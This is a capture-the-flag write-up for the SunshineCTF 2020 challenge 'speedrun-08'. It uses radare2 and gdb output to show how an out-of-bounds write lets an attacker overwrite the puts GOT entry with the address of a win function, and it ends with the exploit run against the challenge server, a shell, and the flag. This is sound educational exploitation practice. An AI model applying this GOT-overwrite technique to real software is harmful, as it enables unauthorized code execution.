# speedrun-08

## Task

nc chal.2020.sunshinectf.org 30008

File: chall_08

Tags: binary exploitation

## Solution

It's a lot harder this time.

```nasm
[0x00400480]> afl
0x00400480    1 42           entry0
0x004004c0    4 42   -> 37   sym.deregister_tm_clones
0x004004f0    4 58   -> 55   sym.register_tm_clones
0x00400530    3 34   -> 29   sym.__do_global_dtors_aux
0x00400560    1 7            entry.init0
0x00400650    1 2            sym.__libc_csu_fini
0x00400654    1 9            sym._fini
0x004005e0    4 101          sym.__libc_csu_init
0x00400567    1 19           sym.win
0x00400460    1 6            sym.imp.system
0x004004b0    1 2            sym._dl_relocate_static_pie
0x0040057a    1 99           main
0x00400470    1 6            sym.imp.__isoc99_scanf
0x00400450    1 6            sym.imp.puts
0x00400428    3 23           sym._init
[0x00400480]> pdf@main
            ; DATA XREF from entry0 @ 0x40049d
┌ 99: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           0x0040057a      55             push rbp
│           0x0040057b      4889e5         mov rbp, rsp
│           0x0040057e      4883ec10       sub rsp, 0x10
│           0x00400582      488d45fc       lea rax, [var_4h]
│           0x00400586      4889c6         mov rsi, rax
│           0x00400589      488d3ddc0000.  lea rdi, [0x0040066c]       ; "%d" ; const char *format
│           0x00400590      b800000000     mov eax, 0
│           0x00400595      e8d6feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x0040059a      488d45f0       lea rax, [var_10h]
│           0x0040059e      4889c6         mov rsi, rax
│           0x004005a1      488d3dc70000.  lea rdi, [0x0040066f]       ; "%ld" ; const char *format
│           0x004005a8      b800000000     mov eax, 0
│           0x004005ad      e8befeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x004005b2      8b45fc         mov eax, dword [var_4h]
│           0x004005b5      488b55f0       mov rdx, qword [var_10h]
│           0x004005b9      4898           cdqe
│           0x004005bb      488d0cc50000.  lea rcx, [rax*8]
│           0x004005c3      488d05760420.  lea rax, obj.target         ; 0x600a40
│           0x004005ca      48891401       mov qword [rcx + rax], rdx
│           0x004005ce      488d3d9e0000.  lea rdi, [0x00400673]       ; "hi" ; const char *s
│           0x004005d5      e876feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004005da      90             nop
│           0x004005db      c9             leave
└           0x004005dc      c3             ret
```

We have only NX enabled but controlling the flow is not that easy this time. We only read in 2 numbers. The first one is added to the address of `obj.target` and the second one is written into the resulting address `mov qword [rcx + rax], rdx`.

I struggled for a while until I found the solution. I didn't understand what `obj.target` was for, since it was empty. Was the goal to print it out? No.

We need to find a memory region where we can write to.

```bash
$ pmap -x $(pgrep chall_08)
PID:   chall_08
Address           Kbytes     RSS   Dirty Mode  Mapping
0000000000400000       4       4       4 r-x-- chall_08
0000000000600000       4       4       4 rw--- chall_08
0000000000601000     132       4       4 rw---   [ anon ]
```

We can write to the region where `obj.target` is located. Now we need to find something that's used in there that we can overwrite.

`puts@plt` is called right after our write. Where is that going? We are not diassembling a function here, note the `pd`:

```nasm
[0x00400480]> pd@sym.imp.puts
      ╎╎╎   ; CALL XREF from main @ 0x4005d5
┌ 6: int sym.imp.puts (const char *s);
└     ╎╎╎   0x00400450      ff2592052000   jmp qword [reloc.puts]      ; [0x6009e8:8]=0x400456 ; "V\x04@"
      ╎╎╎   0x00400456      6800000000     push 0
      └───< 0x0040045b      e9e0ffffff     jmp sym..plt
```

It jumps to the address of `reloc.puts`. Since RELRO is not enabled, we can write there. Let's write the address of the `sym.win`.

Our second parameter is therefore:

```python
>>> 0x400567
4195687
```

What about our first parameter? I used gdb for that, set a breakpoint at the MOV instruction and calculated it there.

```nasm
gdb-peda$ p 0x6009e8 - $rax
$1 = 0xffffffffffffffa8
gdb-peda$ p $rax + $1
$2 = 0x6009e8
gdb-peda$ p/d $1/8
$3 = 2305843009213693941
```

If we enter those two now the address of `sym.win` is written to the relocation address of puts, in the call to `puts@plt` we now jump to the `win` function.

```bash
$ nc chal.2020.sunshinectf.org 30008
2305843009213693941
4195687
ls
chall_08
flag.txt
cat flag.txt
sun{fiction-fa1a28a3ce2fdd96}
```
